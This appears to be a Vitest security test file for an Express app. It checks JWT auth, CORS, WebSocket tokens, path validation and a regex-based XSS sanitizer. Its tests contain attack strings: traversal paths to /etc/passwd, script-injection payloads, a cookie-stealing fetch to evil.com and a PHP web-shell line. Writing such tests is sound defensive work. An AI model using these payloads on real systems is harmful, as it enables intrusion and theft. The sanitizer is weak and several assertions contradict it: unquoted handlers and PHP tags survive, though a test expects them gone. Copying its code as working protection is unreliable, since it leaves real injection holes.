import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import request from 'supertest';
import express, { Express } from 'express';
import cors from 'cors';
import WebSocket from 'ws';
import jwt from 'jsonwebtoken';
import { createServer, Server } from 'http';
import path from 'path';
import fs from 'fs';

describe('End-to-End Security Integration Tests', () => {
  let app: Express;
  let server: Server;
  let wss: WebSocket.Server;
  let serverPort: number;
  const JWT_SECRET = 'test-jwt-secret-e2e';
  const TEST_DIR = path.join(__dirname, '../__temp__', 'e2e-test');

  beforeAll(async () => {
    // Create test directory
    fs.mkdirSync(TEST_DIR, { recursive: true });

    app = express();
    app.use(express.json({ limit: '10mb' }));

    // CORS Configuration (secure)
    const allowedOrigins = [
      'http://localhost:5173',
      'http://localhost:3000',
      'tauri://localhost',
    ];

    app.use(cors({
      origin: (origin, callback) => {
        if (!origin || allowedOrigins.includes(origin)) {
          callback(null, true);
        } else {
          callback(new Error('Not allowed by CORS'));
        }
      },
      credentials: true,
      methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
      allowedHeaders: ['Content-Type', 'Authorization'],
      maxAge: 86400
    }));

    // JWT Token Generation Endpoint
    app.post('/api/auth/ws-token', (req, res) => {
      const clientId = `client-${Date.now()}-${Math.random().toString(36).substring(7)}`;
      const token = jwt.sign({ clientId }, JWT_SECRET, { expiresIn: '1h' });
      res.json({ token, clientId, expiresIn: '1h' });
    });

    // Secure API endpoint requiring authentication
    app.get('/api/secure/data', (req, res) => {
      const authHeader = req.headers.authorization;
      if (!authHeader || !authHeader.startsWith('Bearer ')) {
        return res.status(401).json({ error: 'Unauthorized' });
      }

      try {
        const token = authHeader.substring(7);
        jwt.verify(token, JWT_SECRET);
        res.json({ data: 'Secure data', sensitive: true });
      } catch (error) {
        res.status(401).json({ error: 'Invalid token' });
      }
    });

    // Path validation endpoint (simulating file operations)
    app.post('/api/files/validate-path', (req, res) => {
      const { filePath } = req.body;

      if (!filePath) {
        return res.status(400).json({ error: 'Path is required' });
      }

      // Validate path doesn't contain traversal
      if (filePath.includes('..') || filePath.includes('~')) {
        return res.status(400).json({ error: 'Path traversal detected' });
      }

      // Ensure path is within allowed directory
      const resolvedPath = path.resolve(TEST_DIR, filePath);
      if (!resolvedPath.startsWith(path.resolve(TEST_DIR))) {
        return res.status(403).json({ error: 'Access denied' });
      }

      res.json({ valid: true, resolvedPath });
    });

    // XSS protection endpoint (simulating content rendering)
    app.post('/api/content/sanitize', (req, res) => {
      const { content } = req.body;

      if (!content) {
        return res.status(400).json({ error: 'Content is required' });
      }

      // Simulate DOMPurify sanitization
      let sanitized = content
        .replace(/<script[^>]*>.*?<\/script>/gi, '')
        .replace(/on\w+\s*=\s*["'][^"']*["']/gi, '')
        .replace(/javascript:/gi, '');

      res.json({ sanitized });
    });

    server = createServer(app);

    // WebSocket setup with authentication
    wss = new WebSocket.Server({ noServer: true });

    server.on('upgrade', (request, socket, head) => {
      try {
        const url = new URL(request.url!, `http://${request.headers.host}`);
        const token = url.searchParams.get('token');

        if (!token) {
          socket.write('HTTP/1.1 401 Unauthorized\r\n\r\n');
          socket.destroy();
          return;
        }

        jwt.verify(token, JWT_SECRET);

        wss.handleUpgrade(request, socket, head, (ws) => {
          wss.emit('connection', ws, request);
        });
      } catch (error) {
        socket.write('HTTP/1.1 401 Unauthorized\r\n\r\n');
        socket.destroy();
      }
    });

    wss.on('connection', (ws) => {
      ws.on('message', (message) => {
        ws.send(JSON.stringify({ echo: message.toString() }));
      });
    });

    await new Promise<void>((resolve) => {
      server.listen(0, () => {
        serverPort = (server.address() as any).port;
        resolve();
      });
    });
  });

  afterAll(async () => {
    wss.close();
    await new Promise<void>((resolve) => {
      server.close(() => resolve());
    });

    // Cleanup test directory
    if (fs.existsSync(TEST_DIR)) {
      fs.rmSync(TEST_DIR, { recursive: true, force: true });
    }
  });

  describe('Complete Security Flow', () => {
    it('should authenticate, get secure data, and validate paths in sequence', async () => {
      // Step 1: Get JWT token
      const tokenResponse = await request(app)
        .post('/api/auth/ws-token')
        .expect(200);

      expect(tokenResponse.body.token).toBeDefined();
      expect(tokenResponse.body.clientId).toBeDefined();
      const { token } = tokenResponse.body;

      // Step 2: Use token to access secure endpoint
      const secureResponse = await request(app)
        .get('/api/secure/data')
        .set('Authorization', `Bearer ${token}`)
        .expect(200);

      expect(secureResponse.body.data).toBe('Secure data');

      // Step 3: Validate a safe path
      const pathResponse = await request(app)
        .post('/api/files/validate-path')
        .send({ filePath: 'safe/file.txt' })
        .expect(200);

      expect(pathResponse.body.valid).toBe(true);

      // Step 4: Try to access with invalid token (should fail)
      await request(app)
        .get('/api/secure/data')
        .set('Authorization', 'Bearer invalid-token')
        .expect(401);
    });

    it('should prevent path traversal attacks throughout the flow', async () => {
      const maliciousPaths = [
        '../../../etc/passwd',
        '../../secrets',
        '~/../../etc',
        'safe/../../../etc/passwd',
      ];

      for (const maliciousPath of maliciousPaths) {
        const response = await request(app)
          .post('/api/files/validate-path')
          .send({ filePath: maliciousPath });

        expect([400, 403]).toContain(response.status);
      }
    });

    it('should sanitize XSS content throughout the flow', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>Normal text',
        '<img src=x onerror="alert(1)">',
        '<a href="javascript:alert(1)">Click</a>',
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/content/sanitize')
          .send({ content: payload })
          .expect(200);

        const sanitized = response.body.sanitized;
        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toContain('onerror');
        expect(sanitized).not.toContain('javascript:');
      }
    });

    it('should enforce CORS for all endpoints', async () => {
      const maliciousOrigin = 'http://evil.com';

      // Try to access with malicious origin
      const response = await request(app)
        .get('/api/secure/data')
        .set('Origin', maliciousOrigin)
        .set('Authorization', 'Bearer fake-token');

      // Should not set CORS header for malicious origin
      if (response.headers['access-control-allow-origin']) {
        expect(response.headers['access-control-allow-origin']).not.toBe(maliciousOrigin);
      }
    });

    it('should establish secure WebSocket connection with token', async () => {
      // Get token first
      const tokenResponse = await request(app)
        .post('/api/auth/ws-token')
        .expect(200);

      const { token } = tokenResponse.body;

      // Connect to WebSocket with token
      const ws = new WebSocket(`ws://localhost:${serverPort}?token=${token}`);

      await new Promise<void>((resolve, reject) => {
        ws.on('open', () => {
          ws.send('test message');
        });

        ws.on('message', (data) => {
          const response = JSON.parse(data.toString());
          expect(response.echo).toBe('test message');
          ws.close();
          resolve();
        });

        ws.on('error', reject);

        setTimeout(() => reject(new Error('Timeout')), 3000);
      });
    });

    it('should reject WebSocket connection without token', async () => {
      const ws = new WebSocket(`ws://localhost:${serverPort}`);

      await new Promise<void>((resolve) => {
        ws.on('error', () => {
          resolve(); // Expected to error
        });

        ws.on('close', () => {
          resolve();
        });

        setTimeout(() => resolve(), 2000);
      });
    });
  });

  describe('Multi-Layer Security Validation', () => {
    it('should validate input at all layers', async () => {
      // Layer 1: Content sanitization
      const xssContent = '<script>alert(1)</script>Safe content';
      const sanitizeResponse = await request(app)
        .post('/api/content/sanitize')
        .send({ content: xssContent })
        .expect(200);

      expect(sanitizeResponse.body.sanitized).not.toContain('<script');

      // Layer 2: Path validation
      const traversalPath = '../../etc/passwd';
      const pathResponse = await request(app)
        .post('/api/files/validate-path')
        .send({ filePath: traversalPath })
        .expect(400);

      expect(pathResponse.body.error).toContain('Path traversal');

      // Layer 3: Authentication
      await request(app)
        .get('/api/secure/data')
        .expect(401);
    });

    it('should handle combined attack vectors', async () => {
      // Attempt to combine XSS with path traversal
      const combinedAttack = '<script>fetch("../../etc/passwd")</script>';

      const response = await request(app)
        .post('/api/content/sanitize')
        .send({ content: combinedAttack })
        .expect(200);

      const sanitized = response.body.sanitized;
      expect(sanitized).not.toContain('<script');
      expect(sanitized).not.toContain('fetch');
    });

    it('should maintain security across multiple requests', async () => {
      // Get token
      const tokenResponse = await request(app)
        .post('/api/auth/ws-token')
        .expect(200);

      const { token } = tokenResponse.body;

      // Make multiple authenticated requests
      for (let i = 0; i < 5; i++) {
        const response = await request(app)
          .get('/api/secure/data')
          .set('Authorization', `Bearer ${token}`)
          .expect(200);

        expect(response.body.data).toBe('Secure data');
      }

      // Token should still be valid
      const finalResponse = await request(app)
        .get('/api/secure/data')
        .set('Authorization', `Bearer ${token}`)
        .expect(200);

      expect(finalResponse.body.data).toBe('Secure data');
    });

    it('should handle edge cases securely', async () => {
      // Empty content
      await request(app)
        .post('/api/content/sanitize')
        .send({ content: '' })
        .expect(200);

      // Null path
      await request(app)
        .post('/api/files/validate-path')
        .send({ filePath: null })
        .expect(400);

      // Missing authorization header
      await request(app)
        .get('/api/secure/data')
        .expect(401);

      // Malformed token
      await request(app)
        .get('/api/secure/data')
        .set('Authorization', 'Bearer')
        .expect(401);
    });
  });

  describe('Defense in Depth', () => {
    it('should maintain security even if one layer fails', async () => {
      // Scenario: Even if sanitization is bypassed, other layers protect

      // Try direct path traversal (path validation should catch it)
      await request(app)
        .post('/api/files/validate-path')
        .send({ filePath: '../../../etc/passwd' })
        .expect(400);

      // Try accessing without auth (authentication should catch it)
      await request(app)
        .get('/api/secure/data')
        .expect(401);
    });

    it('should log and prevent suspicious patterns', async () => {
      const suspiciousPayloads = [
        { content: '<script>eval(atob("YWxlcnQoMSk="))</script>' },
        { content: '<img src=x onerror=fetch("http://evil.com?"+document.cookie)>' },
        { content: '<?php system($_GET["cmd"]); ?>' },
      ];

      for (const payload of suspiciousPayloads) {
        const response = await request(app)
          .post('/api/content/sanitize')
          .send(payload)
          .expect(200);

        const sanitized = response.body.sanitized;
        expect(sanitized).not.toContain('script');
        expect(sanitized).not.toContain('onerror');
        expect(sanitized).not.toContain('<?php');
      }
    });
  });
});
